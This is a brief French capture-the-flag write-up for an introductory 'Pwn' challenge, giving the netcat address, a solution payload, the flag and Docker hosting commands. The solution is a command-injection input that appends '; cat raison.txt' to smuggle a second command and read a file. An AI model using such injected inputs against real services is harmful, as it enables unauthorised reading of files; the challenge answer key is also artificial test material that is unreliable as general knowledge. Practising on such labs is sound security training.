# La liste (INTRO)

## Auteur(s)
`Senkei`

## Catégorie
`Pwn`

## Description:
Les enseignants de ton université veulent se débarrasser de toi. Trouve la raison pour prouver que tu n'as rien fait !

`nc 161.35.21.37 40011`

**Flag** : `UHOCTF{Fake_flag}`

---

## Solution

Voici mon payload :)

```text
. raison.txt ; cat raison.txt

```

**Flag** - `UHOCTF{N0n_J3_RigolE_Tu_Peux_Resterehe}`

## Hosting

```bash
sudo docker build -t laliste .
sudo docker network create -d bridge laliste
```

The command to start the challenge is:

```bash
sudo docker run -p 40011:40011 --detach --name laliste --network laliste laliste:latest
```

The command to stop the challenge (since CTRL+C won't work) is:

```bash
sudo docker stop laliste
```
